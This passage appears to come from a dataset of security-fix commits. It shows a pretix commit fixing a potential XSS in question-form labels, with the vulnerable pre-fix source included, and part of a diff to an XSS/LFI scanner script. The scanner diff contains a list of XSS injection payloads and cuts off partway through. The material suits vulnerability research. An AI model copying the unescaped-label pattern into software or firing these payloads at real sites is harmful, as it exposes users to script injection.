{"/src/pretix/base/forms/questions.py": {"changes": [{"diff": "\n                     initialbool = False\n \n                 field = forms.BooleanField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initialbool, widget=widget,\n                 )\n             elif q.type == Question.TYPE_NUMBER:\n                 field = forms.DecimalField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=q.help_text,\n                     initial=initial.answer if initial else None,\n                     min_value=Decimal('0.00'),\n                 )\n             elif q.type == Question.TYPE_STRING:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.answer if initial else None,\n                 )\n             elif q.type == Question.TYPE_TEXT:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Textarea,\n                     initial=initial.answer if initial else None,\n", "add": 4, "remove": 4, "filename": "/src/pretix/base/forms/questions.py", "badparts": ["                    label=q.question, required=q.required,", "                    label=q.question, required=q.required,", "                    label=q.question, required=q.required,", "                    label=q.question, required=q.required,"], "goodparts": ["                    label=label, required=q.required,", "                    label=label, required=q.required,", "                    label=label, required=q.required,", "                    label=label, required=q.required,"]}, {"diff": "\n             elif q.type == Question.TYPE_CHOICE:\n                 field = forms.ModelChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Select,\n                     empty_label='',\n", "add": 1, "remove": 1, "filename": "/src/pretix/base/forms/questions.py", "badparts": ["                    label=q.question, required=q.required,"], "goodparts": ["                    label=label, required=q.required,"]}, {"diff": "\n             elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                 field = forms.ModelMultipleChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.CheckboxSelectMultiple,\n                     initial=initial.options.all() if initial else None,\n                 )\n             elif q.type == Question.TYPE_FILE:\n                 field = forms.FileField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.file if initial else None,\n                     widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                 )\n             elif q.type == Question.TYPE_DATE:\n                 field = forms.DateField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                     widget=DatePickerWidget(),\n                 )\n             elif q.type == Question.TYPE_TIME:\n                 field = forms.TimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                     widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                 )\n             elif q.type == Question.TYPE_DATETIME:\n                 field = SplitDateTimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                     widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n", "add": 5, "remove": 5, "filename": "/src/pretix/base/forms/questions.py", "badparts": ["                    label=q.question, required=q.required,", "                    label=q.question, required=q.required,", "                    label=q.question, required=q.required,", "                    label=q.question, required=q.required,", "                    label=q.question, required=q.required,"], "goodparts": ["                    label=label, required=q.required,", "                    label=label, required=q.required,", "                    label=label, required=q.required,", "                    label=label, required=q.required,", "                    label=label, required=q.required,"]}], "source": "\nimport copy import logging from decimal import Decimal import dateutil.parser import pytz import vat_moss.errors import vat_moss.id from django import forms from django.contrib import messages from django.core.exceptions import ValidationError from django.utils.safestring import mark_safe from django.utils.translation import ugettext_lazy as _ from pretix.base.forms.widgets import( BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget, TimePickerWidget, UploadedFileWidget, ) from pretix.base.models import InvoiceAddress, Question from pretix.base.models.tax import EU_COUNTRIES from pretix.base.settings import PERSON_NAME_SCHEMES from pretix.base.templatetags.rich_text import rich_text from pretix.control.forms import SplitDateTimeField from pretix.helpers.i18n import get_format_without_seconds from pretix.presale.signals import question_form_fields logger=logging.getLogger(__name__) class NamePartsWidget(forms.MultiWidget): widget=forms.TextInput def __init__(self, scheme: dict, field: forms.Field, attrs=None): widgets=[] self.scheme=scheme self.field=field for fname, label, size in self.scheme['fields']: a=copy.copy(attrs) or{} a['data-fname']=fname widgets.append(self.widget(attrs=a)) super().__init__(widgets, attrs) def decompress(self, value): if value is None: return None data=[] for i, field in enumerate(self.scheme['fields']): fname, label, size=field data.append(value.get(fname, \"\")) if '_legacy' in value and not data[-1]: data[-1]=value.get('_legacy', '') return data def render(self, name: str, value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict()) if 'required' in final_attrs: del final_attrs['required'] id_=final_attrs.get('id', None) for i, widget in enumerate(self.widgets): try: widget_value=value[i] except(IndexError, TypeError): widget_value=None if id_: final_attrs=dict( final_attrs, id='%s_%s' %(id_, i), title=self.scheme['fields'][i][1], placeholder=self.scheme['fields'][i][1], ) final_attrs['data-size']=self.scheme['fields'][i][2] output.append(widget.render(name +'_%s' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -> str: return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets) class NamePartsFormField(forms.MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or '' return data def __init__(self, *args, **kwargs): fields=[] defaults={ 'widget': self.widget, 'max_length': kwargs.pop('max_length', None), } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required', True) require_all_fields=kwargs.pop('require_all_fields', False) kwargs['required']=False kwargs['widget']=(kwargs.get('widget') or self.widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value)): raise forms.ValidationError(self.error_messages['required'], code='required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form): \"\"\" This form class is responsible for asking order-related questions. This includes the attendee name for admission tickets, if the corresponding setting is enabled, as well as additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments: :param cartpos: The cart position the form should be for :param event: The event this belongs to \"\"\" cartpos=self.cartpos=kwargs.pop('cartpos', None) orderpos=self.orderpos=kwargs.pop('orderpos', None) pos=cartpos or orderpos item=pos.item questions=pos.item.questions_to_ask event=kwargs.pop('event') super().__init__(*args, **kwargs) if item.admission and event.settings.attendee_names_asked: self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme, label=_('Attendee name'), initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts), ) if item.admission and event.settings.attendee_emails_asked: self.fields['attendee_email']=forms.EmailField( required=event.settings.attendee_emails_required, label=_('Attendee email'), initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email) ) for q in questions: answers=[a for a in pos.answerlist if a.question_id==q.id] if answers: initial=answers[0] else: initial=None tz=pytz.timezone(event.settings.timezone) help_text=rich_text(q.help_text) if q.type==Question.TYPE_BOOLEAN: if q.required: widget=forms.CheckboxInput(attrs={'required': 'required'}) else: widget=forms.CheckboxInput() if initial: initialbool=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text=help_text, initial=initialbool, widget=widget, ) elif q.type==Question.TYPE_NUMBER: field=forms.DecimalField( label=q.question, required=q.required, help_text=q.help_text, initial=initial.answer if initial else None, min_value=Decimal('0.00'), ) elif q.type==Question.TYPE_STRING: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_TEXT: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.Select, empty_label='', initial=initial.options.first() if initial else None, ) elif q.type==Question.TYPE_CHOICE_MULTIPLE: field=forms.ModelMultipleChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.CheckboxSelectMultiple, initial=initial.options.all() if initial else None, ) elif q.type==Question.TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget(position=pos, event=event, answer=initial), ) elif q.type==Question.TYPE_DATE: field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None, widget=DatePickerWidget(), ) elif q.type==Question.TYPE_TIME: field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None, widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None, widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) field.question=q if answers: field.answer=answers[0] self.fields['question_%s' % q.id]=field responses=question_form_fields.send(sender=event, position=pos) data=pos.meta_info_data for r, response in sorted(responses, key=lambda r: str(r[0])): for key, value in response.items(): self.fields[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id', 'internal_reference', 'beneficiary') widgets={ 'is_business': BusinessBooleanRadio, 'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}), 'beneficiary': forms.Textarea(attrs={'rows': 3}), 'company': forms.TextInput(attrs={'data-display-dependency': ' 'vat_id': forms.TextInput(attrs={'data-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings.invoice_address_vatid: del self.fields['vat_id'] if not event.settings.invoice_address_required or self.all_optional: for k, f in self.fields.items(): f.required=False f.widget.is_required=False if 'required' in f.widget.attrs: del f.widget.attrs['required'] elif event.settings.invoice_address_company_required and not self.all_optional: self.initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio(require_business=True) self.fields['company'].required=True self.fields['company'].widget.is_required=True self.fields['company'].widget.attrs['required']='required' del self.fields['company'].widget.attrs['data-display-dependency'] if 'vat_id' in self.fields: del self.fields['vat_id'].widget.attrs['data-display-dependency'] self.fields['name_parts']=NamePartsFormField( max_length=255, required=event.settings.invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional: self.fields['name_parts'].widget.attrs['data-required-if']=' self.fields['name_parts'].widget.attrs['data-no-required-attr']='1' self.fields['company'].widget.attrs['data-required-if']=' if not event.settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get('is_business'): data['company']='' if self.event.settings.invoice_address_required: if data.get('is_business') and not data.get('company'): raise ValidationError(_('You need to provide a company name.')) if not data.get('is_business') and not data.get('name_parts'): raise ValidationError(_('You need to provide your name.')) if 'vat_id' in self.changed_data or not data.get('vat_id'): self.instance.vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'): if data.get('vat_id')[:2] !=str(data.get('country')): raise ValidationError(_('Your VAT ID does not match the selected country.')) try: result=vat_moss.id.validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError): raise ValidationError(_('This VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result. We will therefore ' 'need to charge VAT on your invoice. Please contact support to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) for f in list(self.fields.keys()): if f !='name': del self.fields[f] ", "sourceWithComments": "import copy\nimport logging\nfrom decimal import Decimal\n\nimport dateutil.parser\nimport pytz\nimport vat_moss.errors\nimport vat_moss.id\nfrom django import forms\nfrom django.contrib import messages\nfrom django.core.exceptions import ValidationError\nfrom django.utils.safestring import mark_safe\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom pretix.base.forms.widgets import (\n    BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget,\n    TimePickerWidget, UploadedFileWidget,\n)\nfrom pretix.base.models import InvoiceAddress, Question\nfrom pretix.base.models.tax import EU_COUNTRIES\nfrom pretix.base.settings import PERSON_NAME_SCHEMES\nfrom pretix.base.templatetags.rich_text import rich_text\nfrom pretix.control.forms import SplitDateTimeField\nfrom pretix.helpers.i18n import get_format_without_seconds\nfrom pretix.presale.signals import question_form_fields\n\nlogger = logging.getLogger(__name__)\n\n\nclass NamePartsWidget(forms.MultiWidget):\n    widget = forms.TextInput\n\n    def __init__(self, scheme: dict, field: forms.Field, attrs=None):\n        widgets = []\n        self.scheme = scheme\n        self.field = field\n        for fname, label, size in self.scheme['fields']:\n            a = copy.copy(attrs) or {}\n            a['data-fname'] = fname\n            widgets.append(self.widget(attrs=a))\n        super().__init__(widgets, attrs)\n\n    def decompress(self, value):\n        if value is None:\n            return None\n        data = []\n        for i, field in enumerate(self.scheme['fields']):\n            fname, label, size = field\n            data.append(value.get(fname, \"\"))\n        if '_legacy' in value and not data[-1]:\n            data[-1] = value.get('_legacy', '')\n        return data\n\n    def render(self, name: str, value, attrs=None, renderer=None) -> str:\n        if not isinstance(value, list):\n            value = self.decompress(value)\n        output = []\n        final_attrs = self.build_attrs(attrs or dict())\n        if 'required' in final_attrs:\n            del final_attrs['required']\n        id_ = final_attrs.get('id', None)\n        for i, widget in enumerate(self.widgets):\n            try:\n                widget_value = value[i]\n            except (IndexError, TypeError):\n                widget_value = None\n            if id_:\n                final_attrs = dict(\n                    final_attrs,\n                    id='%s_%s' % (id_, i),\n                    title=self.scheme['fields'][i][1],\n                    placeholder=self.scheme['fields'][i][1],\n                )\n                final_attrs['data-size'] = self.scheme['fields'][i][2]\n            output.append(widget.render(name + '_%s' % i, widget_value, final_attrs, renderer=renderer))\n        return mark_safe(self.format_output(output))\n\n    def format_output(self, rendered_widgets) -> str:\n        return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets)\n\n\nclass NamePartsFormField(forms.MultiValueField):\n    widget = NamePartsWidget\n\n    def compress(self, data_list) -> dict:\n        data = {}\n        data['_scheme'] = self.scheme_name\n        for i, value in enumerate(data_list):\n            data[self.scheme['fields'][i][0]] = value or ''\n        return data\n\n    def __init__(self, *args, **kwargs):\n        fields = []\n        defaults = {\n            'widget': self.widget,\n            'max_length': kwargs.pop('max_length', None),\n        }\n        self.scheme_name = kwargs.pop('scheme')\n        self.scheme = PERSON_NAME_SCHEMES.get(self.scheme_name)\n        self.one_required = kwargs.get('required', True)\n        require_all_fields = kwargs.pop('require_all_fields', False)\n        kwargs['required'] = False\n        kwargs['widget'] = (kwargs.get('widget') or self.widget)(\n            scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs', {})\n        )\n        defaults.update(**kwargs)\n        for fname, label, size in self.scheme['fields']:\n            defaults['label'] = label\n            field = forms.CharField(**defaults)\n            field.part_name = fname\n            fields.append(field)\n        super().__init__(\n            fields=fields, require_all_fields=False, *args, **kwargs\n        )\n        self.require_all_fields = require_all_fields\n        self.required = self.one_required\n\n    def clean(self, value) -> dict:\n        value = super().clean(value)\n        if self.one_required and (not value or not any(v for v in value)):\n            raise forms.ValidationError(self.error_messages['required'], code='required')\n        if self.require_all_fields and not all(v for v in value):\n            raise forms.ValidationError(self.error_messages['incomplete'], code='required')\n        return value\n\n\nclass BaseQuestionsForm(forms.Form):\n    \"\"\"\n    This form class is responsible for asking order-related questions. This includes\n    the attendee name for admission tickets, if the corresponding setting is enabled,\n    as well as additional questions defined by the organizer.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        \"\"\"\n        Takes two additional keyword arguments:\n\n        :param cartpos: The cart position the form should be for\n        :param event: The event this belongs to\n        \"\"\"\n        cartpos = self.cartpos = kwargs.pop('cartpos', None)\n        orderpos = self.orderpos = kwargs.pop('orderpos', None)\n        pos = cartpos or orderpos\n        item = pos.item\n        questions = pos.item.questions_to_ask\n        event = kwargs.pop('event')\n\n        super().__init__(*args, **kwargs)\n\n        if item.admission and event.settings.attendee_names_asked:\n            self.fields['attendee_name_parts'] = NamePartsFormField(\n                max_length=255,\n                required=event.settings.attendee_names_required,\n                scheme=event.settings.name_scheme,\n                label=_('Attendee name'),\n                initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),\n            )\n        if item.admission and event.settings.attendee_emails_asked:\n            self.fields['attendee_email'] = forms.EmailField(\n                required=event.settings.attendee_emails_required,\n                label=_('Attendee email'),\n                initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email)\n            )\n\n        for q in questions:\n            # Do we already have an answer? Provide it as the initial value\n            answers = [a for a in pos.answerlist if a.question_id == q.id]\n            if answers:\n                initial = answers[0]\n            else:\n                initial = None\n            tz = pytz.timezone(event.settings.timezone)\n            help_text = rich_text(q.help_text)\n            if q.type == Question.TYPE_BOOLEAN:\n                if q.required:\n                    # For some reason, django-bootstrap3 does not set the required attribute\n                    # itself.\n                    widget = forms.CheckboxInput(attrs={'required': 'required'})\n                else:\n                    widget = forms.CheckboxInput()\n\n                if initial:\n                    initialbool = (initial.answer == \"True\")\n                else:\n                    initialbool = False\n\n                field = forms.BooleanField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initialbool, widget=widget,\n                )\n            elif q.type == Question.TYPE_NUMBER:\n                field = forms.DecimalField(\n                    label=q.question, required=q.required,\n                    help_text=q.help_text,\n                    initial=initial.answer if initial else None,\n                    min_value=Decimal('0.00'),\n                )\n            elif q.type == Question.TYPE_STRING:\n                field = forms.CharField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_TEXT:\n                field = forms.CharField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Textarea,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE:\n                field = forms.ModelChoiceField(\n                    queryset=q.options,\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Select,\n                    empty_label='',\n                    initial=initial.options.first() if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                field = forms.ModelMultipleChoiceField(\n                    queryset=q.options,\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.CheckboxSelectMultiple,\n                    initial=initial.options.all() if initial else None,\n                )\n            elif q.type == Question.TYPE_FILE:\n                field = forms.FileField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initial.file if initial else None,\n                    widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                )\n            elif q.type == Question.TYPE_DATE:\n                field = forms.DateField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                    widget=DatePickerWidget(),\n                )\n            elif q.type == Question.TYPE_TIME:\n                field = forms.TimeField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                    widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            elif q.type == Question.TYPE_DATETIME:\n                field = SplitDateTimeField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                    widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            field.question = q\n            if answers:\n                # Cache the answer object for later use\n                field.answer = answers[0]\n            self.fields['question_%s' % q.id] = field\n\n        responses = question_form_fields.send(sender=event, position=pos)\n        data = pos.meta_info_data\n        for r, response in sorted(responses, key=lambda r: str(r[0])):\n            for key, value in response.items():\n                # We need to be this explicit, since OrderedDict.update does not retain ordering\n                self.fields[key] = value\n                value.initial = data.get('question_form_data', {}).get(key)\n\n\nclass BaseInvoiceAddressForm(forms.ModelForm):\n    vat_warning = False\n\n    class Meta:\n        model = InvoiceAddress\n        fields = ('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id',\n                  'internal_reference', 'beneficiary')\n        widgets = {\n            'is_business': BusinessBooleanRadio,\n            'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}),\n            'beneficiary': forms.Textarea(attrs={'rows': 3}),\n            'company': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'vat_id': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'internal_reference': forms.TextInput,\n        }\n        labels = {\n            'is_business': ''\n        }\n\n    def __init__(self, *args, **kwargs):\n        self.event = event = kwargs.pop('event')\n        self.request = kwargs.pop('request', None)\n        self.validate_vat_id = kwargs.pop('validate_vat_id')\n        self.all_optional = kwargs.pop('all_optional', False)\n        super().__init__(*args, **kwargs)\n        if not event.settings.invoice_address_vatid:\n            del self.fields['vat_id']\n\n        if not event.settings.invoice_address_required or self.all_optional:\n            for k, f in self.fields.items():\n                f.required = False\n                f.widget.is_required = False\n                if 'required' in f.widget.attrs:\n                    del f.widget.attrs['required']\n        elif event.settings.invoice_address_company_required and not self.all_optional:\n            self.initial['is_business'] = True\n\n            self.fields['is_business'].widget = BusinessBooleanRadio(require_business=True)\n            self.fields['company'].required = True\n            self.fields['company'].widget.is_required = True\n            self.fields['company'].widget.attrs['required'] = 'required'\n            del self.fields['company'].widget.attrs['data-display-dependency']\n            if 'vat_id' in self.fields:\n                del self.fields['vat_id'].widget.attrs['data-display-dependency']\n\n        self.fields['name_parts'] = NamePartsFormField(\n            max_length=255,\n            required=event.settings.invoice_name_required and not self.all_optional,\n            scheme=event.settings.name_scheme,\n            label=_('Name'),\n            initial=(self.instance.name_parts if self.instance else self.instance.name_parts),\n        )\n        if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional:\n            self.fields['name_parts'].widget.attrs['data-required-if'] = '#id_is_business_0'\n            self.fields['name_parts'].widget.attrs['data-no-required-attr'] = '1'\n            self.fields['company'].widget.attrs['data-required-if'] = '#id_is_business_1'\n\n        if not event.settings.invoice_address_beneficiary:\n            del self.fields['beneficiary']\n\n    def clean(self):\n        data = self.cleaned_data\n        if not data.get('is_business'):\n            data['company'] = ''\n        if self.event.settings.invoice_address_required:\n            if data.get('is_business') and not data.get('company'):\n                raise ValidationError(_('You need to provide a company name.'))\n            if not data.get('is_business') and not data.get('name_parts'):\n                raise ValidationError(_('You need to provide your name.'))\n\n        if 'vat_id' in self.changed_data or not data.get('vat_id'):\n            self.instance.vat_id_validated = False\n\n        self.instance.name_parts = data.get('name_parts')\n\n        if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data:\n            pass\n        elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'):\n            if data.get('vat_id')[:2] != str(data.get('country')):\n                raise ValidationError(_('Your VAT ID does not match the selected country.'))\n            try:\n                result = vat_moss.id.validate(data.get('vat_id'))\n                if result:\n                    country_code, normalized_id, company_name = result\n                    self.instance.vat_id_validated = True\n                    self.instance.vat_id = normalized_id\n            except (vat_moss.errors.InvalidError, ValueError):\n                raise ValidationError(_('This VAT ID is not valid. Please re-check your input.'))\n            except vat_moss.errors.WebServiceUnavailableError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country is currently not available. We will therefore '\n                                                     'need to charge VAT on your invoice. You can get the tax amount '\n                                                     'back via the VAT reimbursement process.'))\n            except vat_moss.errors.WebServiceError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country returned an incorrect result. We will therefore '\n                                                     'need to charge VAT on your invoice. Please contact support to '\n                                                     'resolve this manually.'))\n        else:\n            self.instance.vat_id_validated = False\n\n\nclass BaseInvoiceNameForm(BaseInvoiceAddressForm):\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        for f in list(self.fields.keys()):\n            if f != 'name':\n                del self.fields[f]\n"}}, "msg": "Fix potential XSS in questions [not a vulnerability, thanks to CSP]"}}, "https://github.com/asaygo/malwrforensics": {"73d12b579a488013c561179bb95b1d45c2b48e2f": {"url": "https://api.github.com/repos/asaygo/malwrforensics/commits/73d12b579a488013c561179bb95b1d45c2b48e2f", "html_url": "https://github.com/asaygo/malwrforensics/commit/73d12b579a488013c561179bb95b1d45c2b48e2f", "sha": "73d12b579a488013c561179bb95b1d45c2b48e2f", "keyword": "XSS improve", "diff": "diff --git a/scripts/beaxssf.py b/scripts/beaxssf.py\nindex a201fce..29ff78c 100644\n--- a/scripts/beaxssf.py\n+++ b/scripts/beaxssf.py\n@@ -11,7 +11,8 @@\n import re\n \n DEBUG = 0\n-xss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n+xss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",\n+                \"<img src=x onerror=prompt(/test/)>\",\n                 \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                 \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                 \"<img src=test123456.jpg onerror=alert(1)>\"]\n@@ -159,7 +160,7 @@ def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value,\n     return\n \n \n-def scan_for_forms(fname, host, url):\n+def scan_for_forms(fname, host, url, scanopt):\n     print \"[+] Start scan\"\n     rtype=\"\"\n     has_form=0\n@@ -168,6 +169,7 @@ def scan_for_forms(fname, host, url):\n     hidden_param_value=[]\n     page = \"\"\n     form_counter = 0\n+\n     try:\n         with open(fname, \"r\") as f:\n             for line in f:\n@@ -176,9 +178,11 @@ def scan_for_forms(fname, host, url):\n                 #let's check if the page is vulnerable\n                 if line.find(\"</form>\") >=0:\n                     has_form=0\n-                    if len(page) > 0 and len(params) > 0:\n-                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n-                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):\n+                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                         params=[]\n                         hidden_param_name=[]\n                         hidden_param_value=[]\n@@ -186,10 +190,10 @@ def scan_for_forms(fname, host, url):\n \n                 #add input parameters to list\n                 if has_form == 1:\n-                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n+                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                     if m_input:\n                         #check if the parameters already has a value assigned\n-                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n+                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                         if m_value:\n                             hidden_param_name.append(m_input.group(2))\n                         